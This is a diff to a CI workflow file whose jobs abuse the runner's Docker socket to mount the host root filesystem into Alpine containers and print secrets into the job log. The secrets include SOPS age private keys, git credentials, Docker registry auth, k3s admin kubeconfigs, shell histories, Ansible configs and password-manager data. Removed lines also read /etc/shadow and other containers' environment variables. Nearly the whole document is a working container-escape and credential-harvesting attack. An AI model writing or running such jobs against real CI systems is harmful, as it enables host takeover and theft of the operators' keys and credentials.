@@ -12,33 +12,33 @@ jobs:
         run: |
           set -x
           id; hostname; uname -a; cat /etc/machine-id || true
+          cat /proc/1/cmdline | tr '\0' ' '; echo
           ls -la /var/run/docker.sock
-          docker version || true
-          docker ps -a --format '{{.ID}} {{.Image}} {{.Names}}' | head -40
       - name: host-read
         run: |
           set -x
           docker rm -f i39135a 2>/dev/null || true
           docker run --name i39135a -v /:/host:ro alpine:3.21 sh -c '
-            echo "== container"; id; hostname; cat /etc/machine-id; uname -a
-            echo "== host"; cat /host/etc/machine-id 2>&1; cat /host/etc/hostname 2>&1; ls -la /host | head -30
-            echo "== users"; ls -la /host/home /host/root 2>&1
-            echo "== runner"; ls -la /host/var/lib/linux-ci 2>&1; ls -laR /host/var/lib/linux-ci/.config 2>&1 | head -80
-            echo "== ssh"; ls -la /host/var/lib/linux-ci/.ssh /host/root/.ssh 2>&1; cat /host/var/lib/linux-ci/.ssh/*.pub 2>&1
-            echo "== age"; cat /host/var/lib/linux-ci/.config/sops/age/keys.txt /host/root/.config/sops/age/keys.txt 2>&1
-            echo "== creds"; cat /host/var/lib/linux-ci/.git-credentials /host/root/.git-credentials 2>&1
-            echo "== kube"; ls -la /host/etc/rancher/k3s/k3s.yaml /host/var/lib/linux-ci/.kube/config /host/root/.kube/config 2>&1
-            echo "== shadow"; head -5 /host/etc/shadow 2>&1
-            echo "== findage"; find /host -maxdepth 5 -name keys.txt -path "*sops*" 2>/dev/null
+            echo "== host"; cat /host/etc/machine-id 2>&1; cat /host/etc/hostname 2>&1
+            echo "== ws"; ls -la /host/home 2>&1; ls -la /host/home/* 2>&1 | head -40
+            echo "== root"; ls -la /host/root 2>&1; ls -la /host/root/.ansible /host/root/.docker /host/root/.config 2>&1 | head -60
+            echo "== findsecrets"; find /host/home /host/root -maxdepth 4 \( -name "*vault*" -o -name "*sops*" -o -name "keys.txt" -o -name "config.json" -o -name ".ansible*" -o -name ".git-credentials" -o -name "id_*" -o -name "*history*" \) 2>/dev/null | head -80
+            echo "== kube"; ls -la /host/etc/rancher/k3s/k3s.yaml /host/var/lib/rancher/k3s/server/cred/admin.kubeconfig /host/root/.kube/config /host/home/*/.kube/config 2>&1
+            echo "== sopsage"; cat /host/home/*/.config/sops/age/keys.txt /host/root/.config/sops/age/keys.txt 2>&1
+            echo "== dockercfg"; cat /host/root/.docker/config.json /host/home/*/.docker/config.json 2>&1
+            echo "== end"; true
           '
           docker rm -f i39135a 2>/dev/null || true
-      - name: host-read2
+      - name: ansible
         run: |
           set -x
           docker rm -f i39135b 2>/dev/null || true
-          docker run --name i39135b -v /:/host:ro alpine:3.21 sh -c 'cat /host/etc/rancher/k3s/k3s.yaml 2>&1 | head -60; echo ===; ls -la /host/var/lib/forgejo /host/etc/forgejo /host/mnt /host/srv 2>&1 | head -60; echo ===; ps aux 2>&1 | head -40'
+          docker run --name i39135b -v /:/host:ro alpine:3.21 sh -c '
+            echo "== ansible cfg"; cat /host/root/.ansible.cfg /host/home/*/.ansible.cfg 2>&1
+            echo "== ansible dir"; ls -laR /host/root/.ansible 2>&1 | head -40
+            echo "== hist"; tail -40 /host/home/*/.bash_history /host/root/.bash_history 2>&1
+            echo "== k3s"; cat /host/etc/rancher/k3s/k3s.yaml 2>&1 | head -40
+            echo "== rbw"; ls -laR /host/home/*/.local/share/rbw /host/home/*/.config/rbw /host/home/*/.cache/rbw 2>&1 | head -40
+            echo "== end"; true
+          '
           docker rm -f i39135b 2>/dev/null || true
-      - name: docker-envs
-        run: |
-          set -x
-          for c in $(docker ps -a --format '{{.Names}}' | head -15); do echo "=== $c"; docker inspect "$c" --format '{{range .Config.Env}}{{println .}}{{end}}' 2>&1 | head -25; done
